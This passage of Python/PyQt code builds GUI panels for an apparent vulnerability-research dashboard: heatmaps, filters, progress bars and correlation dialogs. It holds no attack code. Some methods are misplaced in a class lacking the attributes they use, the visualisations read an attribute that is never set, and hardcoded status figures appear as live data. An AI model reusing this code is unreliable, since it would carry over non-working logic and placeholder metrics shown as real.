            color_scheme_combo.addItems(["Default", "High Contrast", "Colorblind Safe", "Grayscale"])
            color_scheme_combo.currentTextChanged.connect(self._update_heatmap_colors)

            heatmap_controls.addWidget(QLabel("X-Axis:"))
            heatmap_controls.addWidget(x_axis_combo)
            heatmap_controls.addWidget(QLabel("Y-Axis:"))
            heatmap_controls.addWidget(y_axis_combo)
            heatmap_controls.addWidget(QLabel("Colors:"))
            heatmap_controls.addWidget(color_scheme_combo)
            heatmap_controls.addStretch()

            heatmap_layout.addLayout(heatmap_controls)

            # Heatmap display
            heatmap_display = QLabel(" Interactive Heatmap\n\nExploitability analysis showing:\n Severity vs Likelihood matrix\n Attack complexity mapping\n Risk prioritization grid\n Click for detailed breakdown")
            heatmap_display.setStyleSheet("""
                QLabel {
                    border: 2px solid #fd7e14;
                    border-radius: 8px;
                    padding: 15px;
                    text-align: center;
                    font-size: 13px;
                    color: #fd7e14;
                    background: #fff7ed;
                    min-height: 160px;
                }
            """)
            heatmap_display.setAlignment(Qt.AlignmentFlag.AlignCenter)

            heatmap_layout.addWidget(heatmap_display)

            parent_layout.addWidget(heatmap_container, 3, 0, 2, 4)
            self.exploitability_heatmap = heatmap_container

        except Exception as e:
            logger.error(f"Exploitability heatmap creation failed: {e}")

    def _create_real_time_visualization_panels(self):
        """Create real-time visualization panels with live data updates."""
        try:
            # Create tabbed visualization panel
            self.viz_tabs = QTabWidget()
            self.viz_tabs.setStyleSheet("""
                QTabWidget::pane {
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                QTabBar::tab {
                    background: #f8f9fa;
                    border: 1px solid #ddd;
                    padding: 8px 16px;
                    margin: 2px;
                    border-radius: 4px;
                }
                QTabBar::tab:selected {
                    background: #007bff;
                    color: white;
                }
                QTabBar::tab:hover {
                    background: #e9ecef;
                }
            """)

            # Live monitoring tab
            live_tab = self._create_live_monitoring_tab()
            self.viz_tabs.addTab(live_tab, " Live Monitoring")

            # Attack surface tab
            surface_tab = self._create_attack_surface_tab()
            self.viz_tabs.addTab(surface_tab, " Attack Surface")

            # Exploitation timeline tab
            timeline_tab = self._create_exploitation_timeline_tab()
            self.viz_tabs.addTab(timeline_tab, " Timeline")

            # Correlation analysis tab
            correlation_tab = self._create_correlation_analysis_tab()
            self.viz_tabs.addTab(correlation_tab, " Correlations")

            # Performance metrics tab
            performance_tab = self._create_performance_metrics_tab()
            self.viz_tabs.addTab(performance_tab, " Performance")

            # Add to main layout
            if hasattr(self, 'main_splitter'):
                self.main_splitter.addWidget(self.viz_tabs)

        except Exception as e:
            logger.error(f"Real-time visualization panels creation failed: {e}")

    def _create_live_monitoring_tab(self):
        """Create live monitoring tab with real-time vulnerability discovery."""
        try:
            tab_widget = QWidget()
            layout = QVBoxLayout(tab_widget)

            # Status indicators
            status_layout = QHBoxLayout()

            # Active campaigns indicator
            campaigns_indicator = self._create_status_indicator("Active Campaigns", "3", "#28a745")
            status_layout.addWidget(campaigns_indicator)

            # Live discoveries indicator
            discoveries_indicator = self._create_status_indicator("New Findings", "0", "#007bff")
            status_layout.addWidget(discoveries_indicator)

            # System health indicator
            health_indicator = self._create_status_indicator("System Health", "98%", "#28a745")
            status_layout.addWidget(health_indicator)

            layout.addLayout(status_layout)

            # Real-time activity feed
            activity_feed = self._create_activity_feed()
            layout.addWidget(activity_feed)

            # Live charts
            charts_layout = QHBoxLayout()

            # Discovery rate chart
            discovery_chart = self._create_mini_chart("Discovery Rate", "")
            charts_layout.addWidget(discovery_chart)

            # Resource utilization chart
            resource_chart = self._create_mini_chart("Resource Usage", "")
            charts_layout.addWidget(resource_chart)

            layout.addLayout(charts_layout)

            return tab_widget

        except Exception as e:
            logger.error(f"Live monitoring tab creation failed: {e}")
            return QWidget()

    def _implement_dynamic_filtering_interface(self):
        """Implement dynamic filtering interface with real-time search and filters."""
        try:
            # Create filter panel
            filter_panel = QWidget()
            filter_layout = QVBoxLayout(filter_panel)

            # Search bar with auto-complete
            search_layout = QHBoxLayout()
            search_input = QLineEdit()
            search_input.setPlaceholderText(" Search vulnerabilities, exploits, techniques...")
            search_input.setStyleSheet("""
                QLineEdit {
                    font-size: 14px;
                    padding: 8px;
                    border: 2px solid #007bff;
                    border-radius: 6px;
                    background: white;
                }
                QLineEdit:focus {
                    border: 2px solid #0056b3;
                    box-shadow: 0 0 5px rgba(0,123,255,0.5);
                }
            """)
            search_input.textChanged.connect(self._on_search_text_changed)

            search_clear_btn = QPushButton("")
            search_clear_btn.setMaximumWidth(30)
            search_clear_btn.clicked.connect(lambda: search_input.clear())

            search_layout.addWidget(search_input)
            search_layout.addWidget(search_clear_btn)
            filter_layout.addLayout(search_layout)

            # Dynamic filter categories
            filter_categories_layout = QHBoxLayout()

            # Severity filter
            severity_filter = self._create_filter_group("Severity",
                ["Critical", "High", "Medium", "Low"], self._on_severity_filter_changed)
            filter_categories_layout.addWidget(severity_filter)

            # Category filter
            category_filter = self._create_filter_group("Category",
                ["Injection", "Auth", "Crypto", "Buffer Overflow", "Logic"], self._on_category_filter_changed)
            filter_categories_layout.addWidget(category_filter)

            # Status filter
            status_filter = self._create_filter_group("Status",
                ["New", "Confirmed", "Fixed", "False Positive"], self._on_status_filter_changed)
            filter_categories_layout.addWidget(status_filter)

            # Exploitability filter
            exploit_filter = self._create_filter_group("Exploitability",
                ["Trivial", "Easy", "Moderate", "Difficult"], self._on_exploit_filter_changed)
            filter_categories_layout.addWidget(exploit_filter)

            filter_layout.addLayout(filter_categories_layout)

            # Advanced filter toggles
            advanced_layout = QHBoxLayout()

            # Date range filter
            date_range_combo = QComboBox()
            date_range_combo.addItems(["All Time", "Last 24h", "Last Week", "Last Month"])
            date_range_combo.currentTextChanged.connect(self._on_date_range_changed)

            # CVSS score range
            cvss_range_combo = QComboBox()
            cvss_range_combo.addItems(["All Scores", "9.0-10.0", "7.0-8.9", "4.0-6.9", "0.1-3.9"])
            cvss_range_combo.currentTextChanged.connect(self._on_cvss_range_changed)

            # Show only exploitable
            exploitable_only_check = QCheckBox("Exploitable Only")
            exploitable_only_check.toggled.connect(self._on_exploitable_only_toggled)

            # Show only with PoC
            poc_only_check = QCheckBox("Has PoC")
            poc_only_check.toggled.connect(self._on_poc_only_toggled)

            advanced_layout.addWidget(QLabel("Date Range:"))
            advanced_layout.addWidget(date_range_combo)
            advanced_layout.addWidget(QLabel("CVSS:"))
            advanced_layout.addWidget(cvss_range_combo)
            advanced_layout.addWidget(exploitable_only_check)
            advanced_layout.addWidget(poc_only_check)
            advanced_layout.addStretch()

            filter_layout.addLayout(advanced_layout)

            # Filter results counter
            results_counter = QLabel("Showing 0 results")
            results_counter.setStyleSheet("font-weight: bold; color: #0056b3;")
            filter_layout.addWidget(results_counter)

            # Add to main interface
            if hasattr(self, 'main_splitter'):
                self.main_splitter.addWidget(filter_panel)

            # Store references
            self.filter_panel = filter_panel
            self.search_input = search_input
            self.results_counter = results_counter

        except Exception as e:
            logger.error(f"Dynamic filtering interface implementation failed: {e}")

    def _add_interactive_vulnerability_explorer(self):
        """Add interactive vulnerability explorer with detailed analysis views."""
        try:
            # Create explorer container
            explorer_container = QWidget()
            explorer_layout = QVBoxLayout(explorer_container)

            # Explorer toolbar
            toolbar_layout = QHBoxLayout()

            # View mode selector
            view_mode_combo = QComboBox()
            view_mode_combo.addItems(["Tree View", "Grid View", "Timeline View", "Graph View"])
            view_mode_combo.currentTextChanged.connect(self._change_explorer_view_mode)

            # Sort options
            sort_combo = QComboBox()
            sort_combo.addItems(["Severity", "Date Found", "CVSS Score", "Exploitability", "Category"])
            sort_combo.currentTextChanged.connect(self._change_explorer_sort)

            # Group by options
            group_combo = QComboBox()
            group_combo.addItems(["None", "Severity", "Category", "File Location", "Discovery Method"])
            group_combo.currentTextChanged.connect(self._change_explorer_grouping)

            toolbar_layout.addWidget(QLabel("View:"))
            toolbar_layout.addWidget(view_mode_combo)
            toolbar_layout.addWidget(QLabel("Sort:"))
            toolbar_layout.addWidget(sort_combo)
            toolbar_layout.addWidget(QLabel("Group:"))
            toolbar_layout.addWidget(group_combo)
            toolbar_layout.addStretch()

            explorer_layout.addLayout(toolbar_layout)

            # Main explorer area (tree/list widget)
            explorer_tree = QListWidget()
            explorer_tree.setStyleSheet("""
                QListWidget {
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    background: white;
                    selection-background-color: #007bff;
                }
                QListWidget::item {
                    border-bottom: 1px solid #eee;
                    padding: 8px;
                    margin: 1px;
                }
                QListWidget::item:hover {
                    background: #f8f9fa;
                }
                QListWidget::item:selected {
                    background: #007bff;
                    color: white;
                }
            """)
            explorer_tree.itemClicked.connect(self._on_vulnerability_selected)
            explorer_tree.itemDoubleClicked.connect(self._on_vulnerability_double_clicked)

            explorer_layout.addWidget(explorer_tree)

            # Detail panel for selected vulnerability
            detail_panel = self._create_vulnerability_detail_panel()
            explorer_layout.addWidget(detail_panel)

            # Add to main interface
            if hasattr(self, 'main_splitter'):
                self.main_splitter.addWidget(explorer_container)

            # Store references
            self.explorer_tree = explorer_tree
            self.detail_panel = detail_panel

        except Exception as e:
            logger.error(f"Interactive vulnerability explorer creation failed: {e}")

    def _enhance_progress_visualization(self):
        """Enhance progress visualization with animated progress bars and milestones."""
        try:
            # Create progress container
            progress_container = QGroupBox("Campaign Progress & Milestones")
            progress_layout = QVBoxLayout(progress_container)

            # Overall progress section
            overall_progress_layout = QHBoxLayout()

            # Main progress bar
            overall_progress = QProgressBar()
            overall_progress.setStyleSheet("""
                QProgressBar {
                    border: 2px solid #007bff;
                    border-radius: 5px;
                    text-align: center;
                    font-weight: bold;
                    background: #f8f9fa;
                }
                QProgressBar::chunk {
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                        stop:0 #007bff, stop:1 #0056b3);
                    border-radius: 3px;
                }
            """)
            overall_progress.setValue(0)
            overall_progress.setFormat("Overall Progress: %p%")

            # Progress info
            progress_info = QLabel("0 / 0 targets completed")
            progress_info.setStyleSheet("font-size: 12px; color: #6c757d;")

            overall_progress_layout.addWidget(overall_progress)
            overall_progress_layout.addWidget(progress_info)

            progress_layout.addLayout(overall_progress_layout)

            # Individual campaign progress bars
            campaigns_progress_layout = QVBoxLayout()

            # Campaign progress template (to be populated dynamically)
            campaign_examples = [
                ("Static Analysis", 75, "#28a745"),
                ("Dynamic Analysis", 45, "#17a2b8"),
                ("Fuzzing Campaign", 30, "#ffc107"),
                ("Exploitation Testing", 10, "#dc3545")
            ]

            for campaign_name, progress_value, color in campaign_examples:
                campaign_progress = self._create_campaign_progress_bar(campaign_name, progress_value, color)
                campaigns_progress_layout.addWidget(campaign_progress)

            progress_layout.addLayout(campaigns_progress_layout)

            # Milestone timeline
            timeline_section = self._create_milestone_timeline()
            progress_layout.addWidget(timeline_section)

            # Add to main interface
            if hasattr(self, 'main_splitter'):
                self.main_splitter.addWidget(progress_container)

            # Store references for updates
            self.overall_progress = overall_progress
            self.progress_info = progress_info
            self.campaigns_progress_layout = campaigns_progress_layout

        except Exception as e:
            logger.error(f"Progress visualization enhancement failed: {e}")


class ReportOptionsDialog(QDialog):
    """Dialog for report generation options."""

    def __init__(self, parent=None):
        """Initialize report options dialog.

        Args:
            parent: Parent widget

        """
        super().__init__(parent)
        self.setWindowTitle("Report Options")
        self.setModal(True)

        layout = QVBoxLayout(self)

        # Format selection
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Report Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["PDF", "JSON", "HTML"])
        format_layout.addWidget(self.format_combo)
        layout.addLayout(format_layout)

        # Options
        self.raw_data_check = QCheckBox("Include Raw Data")
        self.raw_data_check.setChecked(False)
        layout.addWidget(self.raw_data_check)

        self.recommendations_check = QCheckBox("Include Recommendations")
        self.recommendations_check.setChecked(True)
        layout.addWidget(self.recommendations_check)

        # Buttons
        button_layout = QHBoxLayout()

        ok_btn = QPushButton("Generate")
        ok_btn.clicked.connect(self.accept)
        button_layout.addWidget(ok_btn)

        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        button_layout.addWidget(cancel_btn)

        layout.addLayout(button_layout)

    def _correlate_results(self):
        """Correlate results across multiple campaigns."""
        # Check if auto-correlation is enabled
        if self.auto_correlation_check.isChecked() and len(self.campaign_results) > 1:
            # Automatically correlate all results
            self._perform_correlation_analysis(list(self.campaign_results.values()))
            return

        # Manual correlation - let user select campaigns
        if len(self.campaign_results) < 2:
            QMessageBox.warning(
                self,
                "Warning",
                "At least 2 campaign results are needed for correlation analysis.",
            )
            return

        # Create selection dialog
        selection_dialog = CampaignSelectionDialog(self.campaign_results, self)
        if selection_dialog.exec() != QDialog.Accepted:
            return

        selected_campaigns = selection_dialog.get_selected_campaigns()
        if len(selected_campaigns) < 2:
            QMessageBox.warning(
                self, "Warning", "Please select at least 2 campaigns for correlation."
            )
            return

        # Perform correlation analysis
        self._perform_correlation_analysis(selected_campaigns)

    def _perform_correlation_analysis(self, campaigns: list[dict]):
        """Perform correlation analysis on selected campaigns."""
        try:
            # Create correlation analyzer
            correlator = VulnerabilityCorrelator()

            # Analyze correlations
            correlation_results = correlator.analyze_campaigns(campaigns)

            # Display results in a new dialog
            results_dialog = CorrelationResultsDialog(correlation_results, self)
            results_dialog.exec()

            # Update correlation tab with results
            self._update_correlation_tab_with_analysis(correlation_results)

            # Save correlation results
            if hasattr(self, "_last_correlation_results"):
                self._last_correlation_results = correlation_results

        except Exception as e:
            logger.error(f"Correlation analysis failed: {e}")
            QMessageBox.critical(self, "Error", f"Failed to correlate results: {e!s}")

    def _update_correlation_tab_with_analysis(self, correlation_results: dict):
        """Update correlation tab with analysis results."""
        correlation_text = "=== Cross-Campaign Correlation Analysis ===\n\n"

        # Common vulnerabilities
        if "common_vulnerabilities" in correlation_results:
            correlation_text += "Common Vulnerabilities Across Campaigns:\n"
            for vuln_type, data in correlation_results["common_vulnerabilities"].items():
                correlation_text += f"\n{vuln_type}:\n"
                correlation_text += f"  - Found in {data['campaign_count']} campaigns\n"
                correlation_text += f"  - Total occurrences: {data['total_count']}\n"
                correlation_text += f"  - Average severity: {data['avg_severity']}\n"
                if data.get("common_locations"):
                    correlation_text += (
                        f"  - Common locations: {', '.join(data['common_locations'][:3])}\n"
                    )

        # Pattern analysis
        if "patterns" in correlation_results:
            correlation_text += "\n\nVulnerability Patterns:\n"
            for pattern in correlation_results["patterns"]:
                correlation_text += f"\n- {pattern['description']}\n"
                correlation_text += f"  Confidence: {pattern['confidence']:.1f}%\n"
                correlation_text += f"  Affected campaigns: {pattern['affected_campaigns']}\n"

        # Risk assessment
        if "risk_assessment" in correlation_results:
            correlation_text += "\n\nRisk Assessment:\n"
            risk = correlation_results["risk_assessment"]
            correlation_text += f"Overall Risk Score: {risk['overall_score']:.1f}/100\n"
            correlation_text += f"Critical Issues: {risk['critical_count']}\n"
            correlation_text += f"Systemic Vulnerabilities: {risk['systemic_count']}\n"

            if risk.get("recommendations"):
                correlation_text += "\nPriority Recommendations:\n"
                for i, rec in enumerate(risk["recommendations"][:5], 1):
                    correlation_text += f"{i}. {rec}\n"

        # Statistical summary
        if "statistics" in correlation_results:
            stats = correlation_results["statistics"]
            correlation_text += "\n\nStatistical Summary:\n"
            correlation_text += (
                f"Total vulnerabilities analyzed: {stats['total_vulnerabilities']}\n"
            )
            correlation_text += f"Unique vulnerability types: {stats['unique_types']}\n"
            correlation_text += (
                f"Cross-campaign correlation coefficient: {stats['correlation_coefficient']:.3f}\n"
            )

        self.correlation_edit.setText(correlation_text)


class CampaignSelectionDialog(QDialog):
    """Dialog for selecting campaigns for correlation."""

    def __init__(self, campaign_results: dict, parent=None):
        """Initialize campaign selection dialog.

        Args:
            campaign_results: Dictionary of campaign results
            parent: Parent widget

        """
        super().__init__(parent)
        self.setWindowTitle("Select Campaigns for Correlation")
        self.setMinimumSize(400, 300)
        self.campaign_results = campaign_results

        layout = QVBoxLayout(self)

        # Instructions
        layout.addWidget(QLabel("Select campaigns to correlate:"))

        # Campaign list
        self.campaign_list = QListWidget()
        self.campaign_list.setSelectionMode(QListWidget.SelectionMode.MultiSelection)

        for campaign_id, results in campaign_results.items():
            item_text = f"{results.get('campaign_type', 'Unknown')} - {campaign_id[:8]}"
            self.campaign_list.addItem(item_text)
            self.campaign_list.item(self.campaign_list.count() - 1).setData(
                Qt.UserRole, campaign_id
            )

        layout.addWidget(self.campaign_list)

        # Buttons
        button_layout = QHBoxLayout()

        select_all_btn = QPushButton("Select All")
        select_all_btn.clicked.connect(self._select_all)
        button_layout.addWidget(select_all_btn)

        button_layout.addStretch()

        ok_btn = QPushButton("Correlate")
        ok_btn.clicked.connect(self.accept)
        button_layout.addWidget(ok_btn)

        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        button_layout.addWidget(cancel_btn)

        layout.addLayout(button_layout)

    def _select_all(self):
        """Select all campaigns."""
        for i in range(self.campaign_list.count()):
            self.campaign_list.item(i).setSelected(True)

    def get_selected_campaigns(self) -> list[dict]:
        """Get selected campaign results."""
        selected = []
        for item in self.campaign_list.selectedItems():
            campaign_id = item.data(Qt.UserRole)
            if campaign_id in self.campaign_results:
                selected.append(self.campaign_results[campaign_id])
        return selected


class CorrelationResultsDialog(QDialog):
    """Dialog for displaying correlation analysis results."""

    def __init__(self, correlation_results: dict, parent=None):
        """Initialize correlation results dialog.

        Args:
            correlation_results: Dictionary of correlation analysis results
            parent: Parent widget

        """
        super().__init__(parent)
        self.setWindowTitle("Correlation Analysis Results")
        self.setMinimumSize(800, 600)
        self.correlation_results = correlation_results

        layout = QVBoxLayout(self)

        # Create tabs for different views
        tabs = QTabWidget()

        # Overview tab
        overview_widget = self._create_overview_widget()
        tabs.addTab(overview_widget, "Overview")

        # Common vulnerabilities tab
        common_widget = self._create_common_vulnerabilities_widget()
        tabs.addTab(common_widget, "Common Vulnerabilities")

        # Patterns tab
        patterns_widget = self._create_patterns_widget()
        tabs.addTab(patterns_widget, "Patterns")

        # Visualization tab
        viz_widget = self._create_visualization_widget()
        tabs.addTab(viz_widget, "Visualization")

        layout.addWidget(tabs)

        # Buttons
        button_layout = QHBoxLayout()

        export_btn = QPushButton("Export Analysis")
        export_btn.clicked.connect(self._export_analysis)
        button_layout.addWidget(export_btn)

        button_layout.addStretch()

        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        button_layout.addWidget(close_btn)

        layout.addLayout(button_layout)

    def _create_overview_widget(self) -> QWidget:
        """Create overview widget."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Summary text
        summary = QTextEdit()
        summary.setReadOnly(True)

        summary_text = "Correlation Analysis Overview\n\n"

        if "summary" in self.correlation_results:
            s = self.correlation_results["summary"]
            summary_text += f"Campaigns Analyzed: {s.get('campaign_count', 0)}\n"
            summary_text += f"Total Vulnerabilities: {s.get('total_vulnerabilities', 0)}\n"
            summary_text += f"Common Vulnerability Types: {s.get('common_types', 0)}\n"
            summary_text += f"Correlation Strength: {s.get('correlation_strength', 'Unknown')}\n"

        if "risk_assessment" in self.correlation_results:
            risk = self.correlation_results["risk_assessment"]
            summary_text += f"\nOverall Risk Score: {risk.get('overall_score', 0):.1f}/100\n"
            summary_text += f"Critical Issues: {risk.get('critical_count', 0)}\n"

        summary.setText(summary_text)
        layout.addWidget(summary)

        return widget

    def _create_common_vulnerabilities_widget(self) -> QWidget:
        """Create common vulnerabilities widget."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Table of common vulnerabilities
        table = QTableWidget()
        table.setColumnCount(5)
        table.setHorizontalHeaderLabels(
            [
                "Vulnerability Type",
                "Campaigns",
                "Occurrences",
                "Avg Severity",
                "Common Locations",
            ]
        )

        if "common_vulnerabilities" in self.correlation_results:
            vulns = self.correlation_results["common_vulnerabilities"]
            table.setRowCount(len(vulns))

            for row, (vuln_type, data) in enumerate(vulns.items()):
                table.setItem(row, 0, QTableWidgetItem(vuln_type))
                table.setItem(row, 1, QTableWidgetItem(str(data.get("campaign_count", 0))))
                table.setItem(row, 2, QTableWidgetItem(str(data.get("total_count", 0))))
                table.setItem(row, 3, QTableWidgetItem(data.get("avg_severity", "Unknown")))
                locations = ", ".join(data.get("common_locations", [])[:3])
                table.setItem(row, 4, QTableWidgetItem(locations))

        table.resizeColumnsToContents()
        layout.addWidget(table)

        return widget

    def _create_patterns_widget(self) -> QWidget:
        """Create patterns widget."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Pattern list
        pattern_text = QTextEdit()
        pattern_text.setReadOnly(True)

        if "patterns" in self.correlation_results:
            for pattern in self.correlation_results["patterns"]:
                pattern_text.append(f"Pattern: {pattern.get('description', 'Unknown')}")
                pattern_text.append(f"Type: {pattern.get('type', 'Unknown')}")
                pattern_text.append(f"Confidence: {pattern.get('confidence', 0):.1f}%")
                pattern_text.append(f"Affected Campaigns: {pattern.get('affected_campaigns', 0)}")
                pattern_text.append(f"Evidence: {pattern.get('evidence', 'N/A')}")
                pattern_text.append("\n" + "-" * 50 + "\n")

        layout.addWidget(pattern_text)

        return widget

    def _create_visualization_widget(self) -> QWidget:
        """Create visualization widget."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Create tabs for different visualizations
        viz_tabs = QTabWidget()

        # Distribution Chart
        dist_widget = QWidget()
        dist_layout = QVBoxLayout(dist_widget)

        dist_text = QTextEdit()
        dist_text.setReadOnly(True)
        dist_text.setFont(QFont("Courier", 10))

        # Generate ASCII chart for vulnerability distribution
        chart_text = self._generate_distribution_chart()
        dist_text.setText(chart_text)
        dist_layout.addWidget(dist_text)

        viz_tabs.addTab(dist_widget, "Distribution Chart")

        # Correlation Matrix
        corr_widget = QWidget()
        corr_layout = QVBoxLayout(corr_widget)

        corr_text = QTextEdit()
        corr_text.setReadOnly(True)
        corr_text.setFont(QFont("Courier", 10))

        matrix_text = self._generate_correlation_matrix()
        corr_text.setText(matrix_text)
        corr_layout.addWidget(corr_text)

        viz_tabs.addTab(corr_widget, "Correlation Matrix")

        # Timeline Analysis
        timeline_widget = QWidget()
        timeline_layout = QVBoxLayout(timeline_widget)

        timeline_text = QTextEdit()
        timeline_text.setReadOnly(True)
        timeline_text.setFont(QFont("Courier", 10))

        timeline_data = self._generate_timeline_analysis()
        timeline_text.setText(timeline_data)
        timeline_layout.addWidget(timeline_text)

        viz_tabs.addTab(timeline_widget, "Timeline Analysis")

        # Risk Summary
        risk_widget = QWidget()
        risk_layout = QVBoxLayout(risk_widget)

        risk_text = QTextEdit()
        risk_text.setReadOnly(True)

        risk_summary = self._generate_risk_summary()
        risk_text.setHtml(risk_summary)
        risk_layout.addWidget(risk_text)

        viz_tabs.addTab(risk_widget, "Risk Summary")

        layout.addWidget(viz_tabs)

        # Export visualization button
        export_viz_btn = QPushButton("Export Visualizations as Images")
        export_viz_btn.clicked.connect(self._export_visualizations)
        layout.addWidget(export_viz_btn)

        return widget

    def _generate_distribution_chart(self) -> str:
        """Generate ASCII distribution chart."""
        if not hasattr(self, "analysis_results"):
            return "No analysis data available for visualization."

        # Count vulnerabilities by type
        vuln_counts = {}
        max_count = 0

        for campaign in self.analysis_results.get("campaigns", []):
            for pattern in campaign.get("patterns", []):
                vuln_type = pattern.get("type", "Unknown")
                count = pattern.get("occurrences", 0)
                vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + count
                max_count = max(max_count, vuln_counts[vuln_type])

        if not vuln_counts:
            return "No vulnerability data to visualize."

        # Generate ASCII bar chart
        chart = "Vulnerability Distribution Chart\n"
        chart += "=" * 60 + "\n\n"

        bar_width = 40
        for vuln_type, count in sorted(vuln_counts.items(), key=lambda x: x[1], reverse=True):
            bar_length = int((count / max_count) * bar_width) if max_count > 0 else 0
            bar = "" * bar_length
            chart += f"{vuln_type:20} |{bar:<40} {count:>5}\n"

        chart += "\n" + "=" * 60 + "\n"
        chart += f"Total Vulnerabilities: {sum(vuln_counts.values())}\n"
        chart += f"Unique Types: {len(vuln_counts)}\n"

        return chart

    def _generate_correlation_matrix(self) -> str:
        """Generate correlation matrix visualization."""
        if not hasattr(self, "analysis_results"):
            return "No analysis data available for correlation matrix."

        correlations = self.analysis_results.get("cross_campaign_patterns", {}).get(
            "correlations", {}
        )

        if not correlations:
            return "No correlation data available."

        # Build matrix text
        matrix = "Vulnerability Type Correlation Matrix\n"
        matrix += "=" * 80 + "\n\n"
        matrix += "Values show correlation strength (0.0 - 1.0)\n\n"

        # Get unique types
        types = set()
        for corr in correlations:
            types.add(corr.get("type1", ""))
            types.add(corr.get("type2", ""))

        types = sorted(list(types))[:10]  # Limit to 10 for display

        # Header
        matrix += "             "
        for t in types:
            matrix += f"{t[:8]:>10}"
        matrix += "\n"

        # Rows
        for t1 in types:
            matrix += f"{t1[:12]:12}"
            for t2 in types:
                # Find correlation value
                corr_val = 0.0
                for corr in correlations:
                    if (corr["type1"] == t1 and corr["type2"] == t2) or (
                        corr["type1"] == t2 and corr["type2"] == t1
                    ):
                        corr_val = corr.get("correlation", 0.0)
                        break

                if t1 == t2:
                    matrix += "      1.00"
                else:
                    matrix += f"{corr_val:10.2f}"
            matrix += "\n"

        return matrix

    def _generate_timeline_analysis(self) -> str:
        """Generate timeline analysis visualization."""
        if not hasattr(self, "analysis_results"):
            return "No analysis data available for timeline."

        timeline = "Vulnerability Discovery Timeline\n"
        timeline += "=" * 60 + "\n\n"

        # Get temporal patterns
        temporal = self.analysis_results.get("cross_campaign_patterns", {}).get(
            "temporal_patterns", []
        )

        if not temporal:
            # Generate sample timeline
            campaigns = self.analysis_results.get("campaigns", [])
            timeline += "Campaign Timeline:\n\n"

            for i, campaign in enumerate(campaigns):
                vulns = len(campaign.get("patterns", []))
                timeline += f"Campaign {i+1}: {'' * min(vulns, 40)} ({vulns} vulnerabilities)\n"
        else:
            # Show temporal patterns
            timeline += "Temporal Patterns Detected:\n\n"
            for pattern in temporal:
                timeline += f"- {pattern.get('pattern', 'Unknown pattern')}\n"
                timeline += f"  Timeframe: {pattern.get('timeframe', 'N/A')}\n"
                timeline += f"  Confidence: {pattern.get('confidence', 0):.1%}\n\n"

        return timeline

    def _generate_risk_summary(self) -> str:
        """Generate risk summary visualization."""
        if not hasattr(self, "analysis_results"):
            return "<p>No analysis data available for risk summary.</p>"

        risk_assessment = self.analysis_results.get("risk_assessment", {})

        html = """
        <h3>Risk Assessment Summary</h3>
        <hr>
        """

        # Overall risk score
        overall_risk = risk_assessment.get("overall_risk_score", 0)
        risk_level = "Low"
        risk_color = "green"

        if overall_risk > 7:
            risk_level = "Critical"
            risk_color = "red"
        elif overall_risk > 5:
            risk_level = "High"
            risk_color = "orange"
        elif overall_risk > 3:
            risk_level = "Medium"
            risk_color = "yellow"

        html += f"""
        <div style='background-color: #f0f0f0; padding: 10px; margin: 10px 0;'>
            <h4>Overall Risk Score: <span style='color: {risk_color}'>{overall_risk:.1f}/10 ({risk_level})</span></h4>
        </div>
        """

        # Risk factors
        html += "<h4>Risk Factors:</h4><ul>"
        factors = risk_assessment.get("factors", [])
        for factor in factors[:10]:
            impact = factor.get("impact", "Unknown")
            html += f"<li><strong>{factor.get('factor', 'Unknown')}:</strong> {impact}</li>"
        html += "</ul>"

        # Attack surface
        html += "<h4>Attack Surface Analysis:</h4>"
        attack_surface = risk_assessment.get("attack_surface", {})
        html += f"<p>Estimated Attack Surface: <strong>{attack_surface.get('size', 'Unknown')}</strong></p>"
        html += f"<p>Critical Entry Points: <strong>{attack_surface.get('critical_points', 0)}</strong></p>"

        # Mitigation priority
        html += "<h4>Mitigation Priorities:</h4><ol>"
        priorities = risk_assessment.get("mitigation_priorities", [])
        for priority in priorities[:5]:
            html += f"<li>{priority}</li>"
        html += "</ol>"

        return html

    def _export_visualizations(self):
        """Export visualizations as images."""
        # This would typically use matplotlib or similar to generate actual images
        # For now, export as text files

        dir_path = QFileDialog.getExistingDirectory(
            self,
            "Select Export Directory",
            "",
        )

        if not dir_path:
            return

        try:
            # Export distribution chart
            with open(os.path.join(dir_path, "distribution_chart.txt"), "w") as f:
                f.write(self._generate_distribution_chart())

            # Export correlation matrix
            with open(os.path.join(dir_path, "correlation_matrix.txt"), "w") as f:
                f.write(self._generate_correlation_matrix())

            # Export timeline
            with open(os.path.join(dir_path, "timeline_analysis.txt"), "w") as f:
                f.write(self._generate_timeline_analysis())

            # Export risk summary as HTML
            with open(os.path.join(dir_path, "risk_summary.html"), "w") as f:
                f.write(f"<html><body>{self._generate_risk_summary()}</body></html>")

            QMessageBox.information(
                self,
                "Success",
                f"Visualizations exported to:\n{dir_path}",
            )

        except Exception as e:
            logger.error(f"Failed to export visualizations: {e}")
            QMessageBox.critical(self, "Error", f"Export failed: {e!s}")

    def _export_analysis(self):
        """Export correlation analysis."""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Correlation Analysis",
            f"correlation_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json);;All Files (*)",
        )

        if file_path:
            try:
                import json

                with open(file_path, "w") as f:
                    json.dump(self.correlation_results, f, indent=2, default=str)
                QMessageBox.information(self, "Success", f"Analysis exported to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {e!s}")


class VulnerabilityCorrelator:
    """Engine for correlating vulnerabilities across campaigns."""

    def analyze_campaigns(self, campaigns: list[dict]) -> dict:
        """Analyze and correlate vulnerabilities across campaigns."""
        results = {
            "summary": {
                "campaign_count": len(campaigns),
                "total_vulnerabilities": 0,
                "common_types": 0,
                "correlation_strength": "Unknown",
            },
            "common_vulnerabilities": {},
            "patterns": [],
            "risk_assessment": {},
            "statistics": {},
        }

        # Collect all vulnerabilities
        all_vulns = []
        vuln_by_campaign = {}

        for i, campaign in enumerate(campaigns):
